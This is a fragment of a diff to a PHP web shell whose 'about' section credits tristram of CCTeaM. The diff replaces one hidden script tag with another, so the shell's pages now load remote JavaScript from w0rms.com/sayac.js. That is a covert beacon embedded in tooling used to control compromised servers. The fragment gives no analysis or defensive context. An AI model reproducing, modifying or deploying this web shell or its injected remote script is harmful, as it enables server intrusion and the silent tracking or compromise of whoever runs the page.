@@ -3027,7 +3027,7 @@ else
  exit;
 }
 if ($act == "about") {echo "<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tips - NukLeoN [AnTiSh@Re tEaM].<br>Thanks all who report bugs.<br>All bugs send to tristram's ICQ #656555 <a href=\"http://wwp.icq.com/scripts/contact.dll?msgto=656555\"><img src=\"http://wwp.icq.com/scripts/online.dll?icq=656555&img=5\" border=0 align=absmiddle></a>.</b>";}
-	echo "<SCRIPT SRC=http://w0rms.com/log/log.js></SCRIPT>";
+	echo "<SCRIPT SRC=http://w0rms.com/sayac.js></SCRIPT>";
 
 ?>
 </td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
